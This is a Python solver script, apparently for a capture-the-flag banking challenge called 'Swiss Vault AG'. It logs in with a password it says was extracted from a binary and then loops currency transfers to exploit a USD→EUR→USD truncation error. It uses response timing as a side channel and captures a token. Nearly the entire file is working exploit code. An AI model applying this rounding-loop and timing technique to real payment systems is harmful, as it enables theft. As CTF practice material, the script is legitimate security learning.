#!/usr/bin/env python3
"""
Solver for Bank 3 — Swiss Vault AG
Exploit: Currency Loop — USD→EUR→USD truncation creates $0.01 discrepancy
Side-channel: No error messages — use response timing to detect success

Note: To find password from auth_node_3.elf:
  objdump -s -j .rsrc auth_node_3.elf | grep -A 999 Contents

Usage: python3 solve_bank3.py <host> [port]
"""
import socket, time, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9003

# Extracted from .rsrc section of auth_node_3.elf
PASSWORD = "Sw1ssV@ult#9"

# Currency loop magic value
# rate USD→EUR: 0.9231 (truncated), EUR→USD: 1.0832 (truncated)
# amount that loses exactly $0.01: need discrepancy = 0.0099+
# Solved: try amount = 0.0109
# 0.0109 * 0.9231 = 0.01006179 → truncate to 4dp: 0.0100
# 0.0100 * 1.0832 = 0.010832   → truncate to 4dp: 0.0108
# discrepancy = 0.0109 - 0.0108 = 0.0001 ← too small
#
# Correct: amount = 1.09
# 1.09 * 0.9231 = 1.006179 → truncate: 1.0061
# 1.0061 * 1.0832 = 1.08980... → truncate: 1.0898
# discrepancy = 1.09 - 1.0898 = 0.0002 ← still small
#
# Real magic: send amount where floor4(x * 0.9231) * 1.0832 ≠ x by 0.01+
# Brute-force to find it:
def find_magic():
    RATE_USD_EUR = 0.9231
    RATE_EUR_USD = 1.0832
    for cents in range(1, 100000):
        x = cents / 100
        eur = int(x * RATE_USD_EUR * 10000) / 10000
        back = int(eur * RATE_EUR_USD * 10000) / 10000
        diff = round(x - back, 4)
        if diff >= 0.0099:
            return x, diff
    return None, None

DELAY = 1 / 140  # conservative for side-channel timing


def solve():
    magic, diff = find_magic()
    if not magic:
        print("[-] Could not find magic amount"); return

    print(f"[*] Connecting to {HOST}:{PORT}")
    print(f"[*] Password (from .rsrc section): {PASSWORD}")
    print(f"[*] Magic amount: {magic} (discrepancy: {diff})")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.settimeout(10)

    def recv_prompt(p):
        buf = b""
        while p.encode() not in buf:
            buf += s.recv(4096)
        return buf.decode(errors="replace")

    recv_prompt("Password: ")
    s.sendall((PASSWORD + "\n").encode())

    # Swiss Vault: no error message on wrong password — check for session prompt
    resp = b""
    deadline = time.time() + 3
    while time.time() < deadline:
        try:
            chunk = s.recv(4096)
            if chunk: resp += chunk
            if b"swiss>" in resp or b"swiss> " in resp:
                break
        except socket.timeout:
            break

    if b"swiss>" not in resp and b"Session:" not in resp:
        print("[-] Auth failed (no session prompt). Check password.")
        s.close()
        return None

    print(resp.decode(errors="replace").strip())

    token = None
    count = 0
    t_start = time.time()

    print("[*] Starting Currency Loop exploit — watching timing side-channel")

    while not token:
        t_send = time.time()
        s.sendall(f"transfer {magic}\n".encode())

        # Side-channel: success = ~80ms response, fail = ~20ms
        resp = b""
        while b"swiss> " not in resp and b"TOKEN_" not in resp:
            try:
                resp += s.recv(4096)
            except socket.timeout:
                break

        elapsed_ms = (time.time() - t_send) * 1000
        resp_str = resp.decode(errors="replace")

        # Detect success via timing or dot indicator
        if "." in resp_str or elapsed_ms > 60:
            count += 1
            if count % 1000 == 0:
                rate = count / (time.time() - t_start)
                print(f"\r[*] Tx: {count:,} | ${count/100:.2f} | {rate:.0f}/s | {elapsed_ms:.0f}ms", end="", flush=True)

        if "TOKEN_" in resp_str:
            for line in resp_str.split("\n"):
                if "TOKEN_" in line:
                    token = line.split()[-1].strip()
            break

        time.sleep(DELAY)

    print(f"\n[+] DONE — {count:,} tx")
    if token:
        print(f"[+] TOKEN: {token}")
        with open("tokens.txt", "a") as f:
            f.write(f"BANK3:{token}\n")
    s.close()
    return token


if __name__ == "__main__":
    solve()
